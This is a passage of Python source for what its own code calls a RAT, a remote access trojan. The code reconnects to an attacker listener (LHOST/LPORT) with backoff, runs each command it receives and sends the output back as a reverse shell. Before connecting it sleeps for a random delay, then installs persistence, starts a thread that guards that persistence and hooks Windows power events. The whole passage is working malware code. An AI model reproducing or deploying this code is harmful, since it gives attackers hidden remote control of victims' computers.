            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((LHOST, LPORT))
            _enable_tcp_keepalive(sock)
        except (ConnectionRefusedError, OSError):
            time.sleep(delay * random.uniform(0.75, 1.25))
            # back off gradually (cap 60s) so a down listener isn't hammered
            delay = min(delay * 1.5, 60.0)
            continue

        # connected: stop retrying, reset backoff for the next drop
        delay = float(RECONNECT_DELAY)

        try:
            while True:
                data = sock.recv(BUFFER)
                if not data:
                    break

                cmd = data.decode("utf-8", errors="replace").strip()
                if not cmd:
                    continue

                output = execute_command(cmd)
                sock.sendall(output)
        except (ConnectionResetError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        lo, hi = PRE_CONNECT_SLEEP
        if hi > 0 and os.environ.get("RAT_FAST") != "1":
            time.sleep(random.uniform(lo, hi))
    except Exception:
        pass
    # Source mode (loader_py v3, RAT_SOURCE=1): the loader owns persistence
    # and feeds this script via stdin - skip self-install entirely.
    if os.environ.get("RAT_SOURCE") != "1":
        install_persistence()   # install + verified handoff on first run
        threading.Thread(target=_persistence_guard, daemon=True,
                         name=f"guard-{BUILD_ID[:8]}").start()
    _start_power_hook()   # WM_POWERBROADCAST watcher (suspend/resume)
    connect()